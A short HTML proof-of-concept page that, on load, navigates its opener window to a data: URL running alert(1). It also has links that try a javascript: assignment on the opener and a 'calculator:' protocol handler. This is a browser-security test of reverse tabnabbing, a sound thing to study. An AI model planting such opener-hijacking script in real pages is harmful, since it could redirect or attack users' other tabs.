<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
        // Ensure that the code runs after the page has fully loaded
        window.onload = function() {
            if (opener) {
                // Encode the JavaScript code to be executed
                const encodedCommand = encodeURIComponent('alert(1)');
                opener.location = `data:text/html,<script>${encodedCommand}<\/script>`;
            } else {
                console.error('No opener found');
            }
        };
    </script>
</head>
<body>
      <a href="javascript:window.opener.location='alert(1)'">Click Me!</a>
    <a href="calculator:">Click Math!</a>
</body>
</html>
